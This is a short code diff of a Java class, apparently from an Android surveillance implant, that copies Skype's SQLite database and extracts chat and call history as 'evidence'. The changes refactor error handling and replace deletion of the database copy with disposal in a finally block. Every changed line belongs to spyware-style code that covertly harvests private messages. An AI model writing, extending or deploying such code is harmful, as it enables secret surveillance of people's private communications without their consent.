@@ -4,7 +4,6 @@ import java.io.File;
 import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Date;
-import java.util.Hashtable;
 import java.util.List;
 import java.util.concurrent.Semaphore;
 
@@ -113,7 +112,13 @@ public class ChatSkype extends SubModuleChat {
 			}
 
 			GenericSqliteHelper helper = openSkypeDBHelper(account);
-			if (helper != null) {
+			if (helper == null) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (readSkypeMessageHistory) Error, file not readable: " + account);
+				}
+				return;
+			}
+			try{
 
 				ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.SKYPE, account);
 				if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
@@ -146,11 +151,9 @@ public class ChatSkype extends SubModuleChat {
 				if (maxLast > 0) {
 					markup.serialize(maxLast);
 				}
-				helper.deleteDb();
-			} else {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (readSkypeMessageHistory) Error, null helper");
-				}
+
+			} finally {
+				helper.disposeDb();
 			}
 		} finally {
 			readChatSemaphore.release();
@@ -186,7 +189,6 @@ public class ChatSkype extends SubModuleChat {
 			}
 
 			helper = GenericSqliteHelper.openCopy(dbFile);
-			helper.deleteAtEnd = false;
 		}
 
 		return helper;
@@ -415,7 +417,7 @@ public class ChatSkype extends SubModuleChat {
 			}
 		};
 
-		helper.traverseRawQuery(sqlQuery, new String[]{}, visitor, true);
+		helper.traverseRawQuery(sqlQuery, new String[]{}, visitor);
 
 		return callInfo.valid;
 	}
